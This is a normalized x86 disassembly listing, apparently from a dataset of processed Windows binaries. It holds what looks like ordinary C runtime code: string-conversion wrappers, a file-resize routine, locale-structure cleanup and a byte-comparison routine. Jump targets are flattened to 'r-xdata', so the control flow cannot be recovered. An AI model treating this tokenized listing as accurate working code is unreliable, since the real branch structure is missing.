push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ecx * 2 + 0x8 ]
cmp ecx 0x400
ja r-xdata
push ebx
call sub_417bc8
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_417c5e
mov edi eax
add esp 0x18
test edi edi
je r-xdata
push ecx
call sub_40f6c9
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax ecx
call sub_418e40
mov ebx esp
test ebx ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
push edi
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_417c5e
add esp 0x18
test eax eax
je r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax ecx
ja r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_417c5e
add esp 0x18
jmp r-xdata
push esi
call sub_417bc8
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
push eax
call sub_40f6c9
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_418e40
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_41853f
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_411f0f
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_418356
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_418583
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov ecx eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
leave
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_412270
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_417bc8
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
push eax
call sub_40f6c9
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_418e40
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_41866f
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_411f0f
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_418583
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4186ad
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x1
push esi
push esi
push edi
mov ebx esi
mov [ ebp - 0x8 ] esi
call sub_413f47
mov ecx edx
mov [ ebp - 0x18 ] eax
and eax ecx
add esp 0x10
mov [ ebp - 0x14 ] ecx
cmp eax 0xffffffff
je r-xdata
call sub_410eb4
mov eax [ eax ]
push 0x2
push esi
push esi
push edi
call sub_413f47
mov ecx eax
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
sub esi ecx
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
test eax eax
jg r-xdata
jg r-xdata
push 0x0
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push edi
call sub_413f47
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
push 0x1000
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_413f47
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test esi esi
jae r-xdata
push 0x8000
push edi
call sub_41888b
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_410eb4
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push edi
call sub_417ab9
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov ebx eax
mov eax edx
mov ecx ebx
and ecx eax
mov [ ebp - 0x8 ] eax
cmp ecx 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_410eb4
mov [ eax ] 0xd
call sub_410e80
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
call sub_410e80
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
mov eax [ ebp - 0x4 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
mov eax 0x1000
jmp r-xdata
cmp esi 0x1000
jb r-xdata
or ebx 0xffffffff
or [ ebp - 0x8 ] ebx
call sub_410eb4
mov [ eax ] 0xd
push [ ebp - 0x10 ]
push edi
call sub_41888b
pop ecx
pop ecx
push [ ebp - 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
jg r-xdata
push eax
push [ ebp - 0xc ]
push edi
call sub_413336
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and ebx [ ebp - 0x8 ]
cmp ebx 0xffffffff
je r-xdata
test eax eax
jl r-xdata
test esi esi
je r-xdata
jmp r-xdata
sub_418861
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
push 0x16
pop eax
pop ebp
retn
sub_41888b
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx esi
sar ebx 0x5
and esi 0x1f
shl esi 0x6
push edi
mov edi [ ebx * 4 + rw-data ]
mov cl [ edi + esi + 0x4 ]
movzx eax cl
and eax 0x80
mov [ ebp + 0x8 ] eax
mov al [ edi + esi + 0x24 ]
add al al
movsx edx al
mov eax [ ebp + 0xc ]
sar edx 0x1
cmp eax 0x4000
je r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov eax [ ebx * 4 + rw-data ]
and [ eax + esi + 0x24 ] 0x80
cmp eax 0x8000
je r-xdata
neg edx
sbb edx edx
and edx 0xc000
lea eax [ edx + 0x4000 ]
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and cl 0x7f
mov [ edi + esi + 0x4 ] cl
jmp r-xdata
cmp eax 0x10000
je r-xdata
cmp [ ebp + 0x8 ] 0x0
pop edi
pop esi
pop ebx
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x82
or al 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov [ ecx + esi + 0x24 ] al
jmp r-xdata
cmp eax 0x40000
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x81
or al 0x1
sub_418958
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
push eax
call sub_40f691
pop ecx
sub_418a54
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40f691
pop ecx
push eax
call sub_40f691
pop ecx
sub_418abb
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_40f691
push [ esi + 0x8 ]
call sub_40f691
push [ esi + 0xc ]
call sub_40f691
push [ esi + 0x10 ]
call sub_40f691
push [ esi + 0x14 ]
call sub_40f691
push [ esi + 0x18 ]
call sub_40f691
push [ esi ]
call sub_40f691
push [ esi + 0x20 ]
call sub_40f691
push [ esi + 0x24 ]
call sub_40f691
push [ esi + 0x28 ]
call sub_40f691
push [ esi + 0x2c ]
call sub_40f691
push [ esi + 0x30 ]
call sub_40f691
push [ esi + 0x34 ]
call sub_40f691
push [ esi + 0x1c ]
call sub_40f691
push [ esi + 0x38 ]
call sub_40f691
push [ esi + 0x3c ]
call sub_40f691
add esp 0x40
push [ esi + 0x40 ]
call sub_40f691
push [ esi + 0x44 ]
call sub_40f691
push [ esi + 0x48 ]
call sub_40f691
push [ esi + 0x4c ]
call sub_40f691
push [ esi + 0x50 ]
call sub_40f691
push [ esi + 0x54 ]
call sub_40f691
push [ esi + 0x58 ]
call sub_40f691
push [ esi + 0x5c ]
call sub_40f691
push [ esi + 0x60 ]
call sub_40f691
push [ esi + 0x64 ]
call sub_40f691
push [ esi + 0x68 ]
call sub_40f691
push [ esi + 0x6c ]
call sub_40f691
push [ esi + 0x70 ]
call sub_40f691
push [ esi + 0x74 ]
call sub_40f691
push [ esi + 0x78 ]
call sub_40f691
push [ esi + 0x7c ]
call sub_40f691
add esp 0x40
push [ esi + 0x80 ]
call sub_40f691
push [ esi + 0x84 ]
call sub_40f691
push [ esi + 0x88 ]
call sub_40f691
push [ esi + 0x8c ]
call sub_40f691
push [ esi + 0x90 ]
call sub_40f691
push [ esi + 0x94 ]
call sub_40f691
push [ esi + 0x98 ]
call sub_40f691
push [ esi + 0x9c ]
call sub_40f691
push [ esi + 0xa0 ]
call sub_40f691
push [ esi + 0xa4 ]
call sub_40f691
push [ esi + 0xa8 ]
call sub_40f691
push [ esi + 0xb8 ]
call sub_40f691
push [ esi + 0xbc ]
call sub_40f691
push [ esi + 0xc0 ]
call sub_40f691
push [ esi + 0xc4 ]
call sub_40f691
push [ esi + 0xc8 ]
call sub_40f691
add esp 0x40
push [ esi + 0xcc ]
call sub_40f691
push [ esi + 0xb4 ]
call sub_40f691
push [ esi + 0xd4 ]
call sub_40f691
push [ esi + 0xd8 ]
call sub_40f691
push [ esi + 0xdc ]
call sub_40f691
push [ esi + 0xe0 ]
call sub_40f691
push [ esi + 0xe4 ]
call sub_40f691
push [ esi + 0xe8 ]
call sub_40f691
push [ esi + 0xd0 ]
call sub_40f691
push [ esi + 0xec ]
call sub_40f691
push [ esi + 0xf0 ]
call sub_40f691
push [ esi + 0xf4 ]
call sub_40f691
push [ esi + 0xf8 ]
call sub_40f691
push [ esi + 0xfc ]
call sub_40f691
push [ esi + 0x100 ]
call sub_40f691
push [ esi + 0x104 ]
call sub_40f691
add esp 0x40
push [ esi + 0x108 ]
call sub_40f691
push [ esi + 0x10c ]
call sub_40f691
push [ esi + 0x110 ]
call sub_40f691
push [ esi + 0x114 ]
call sub_40f691
push [ esi + 0x118 ]
call sub_40f691
push [ esi + 0x11c ]
call sub_40f691
push [ esi + 0x120 ]
call sub_40f691
push [ esi + 0x124 ]
call sub_40f691
push [ esi + 0x128 ]
call sub_40f691
push [ esi + 0x12c ]
call sub_40f691
push [ esi + 0x130 ]
call sub_40f691
push [ esi + 0x134 ]
call sub_40f691
push [ esi + 0x138 ]
call sub_40f691
push [ esi + 0x13c ]
call sub_40f691
push [ esi + 0x140 ]
call sub_40f691
push [ esi + 0x144 ]
call sub_40f691
add esp 0x40
push [ esi + 0x148 ]
call sub_40f691
push [ esi + 0x14c ]
call sub_40f691
push [ esi + 0x150 ]
call sub_40f691
push [ esi + 0x154 ]
call sub_40f691
push [ esi + 0x158 ]
call sub_40f691
push [ esi + 0x15c ]
call sub_40f691
push [ esi + 0x160 ]
call sub_40f691
add esp 0x1c
sub_418ea2
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax ebx
push esi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
jmp r-xdata
dec eax
je r-xdata
sub ecx eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
dec eax
je r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
mov edx [ ebp + 0xc ]
dec eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub esi eax
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x20
jb r-xdata
movzx ecx [ edx + 0x2 ]
movzx eax [ esi + 0x2 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
add esi ebx
add edx ebx
cmp ebx 0x1f
ja r-xdata
mov eax [ esi ]
cmp eax [ edx ]
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
jmp [ ebx * 4 + jump_table_41a59a ]
xor ecx ecx
movzx edi al
movzx eax [ edx ]
sub edi eax
je r-xdata
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ esi - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ esi - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ esi - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ esi - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ esi - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ esi - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ esi - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ esi - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ esi - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ esi - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ esi - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ esi - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ esi - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ edx - 0x1 ]
movzx ecx [ esi - 0x1 ]
sub ecx eax
je r-xdata
mov eax [ esi - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ esi - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ esi - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ esi - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ esi - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ esi - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ esi - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ esi - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ esi - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ esi - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ esi - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ esi - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ esi - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ esi - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ esi - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
mov eax ecx
pop edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx edi [ esi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xc ]
movzx edi [ esi - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xa ]
movzx edi [ esi - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1f ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xf ]
movzx edi [ esi - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
movzx eax [ edx - 0x2 ]
movzx edi [ esi - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x4 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1e ]
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
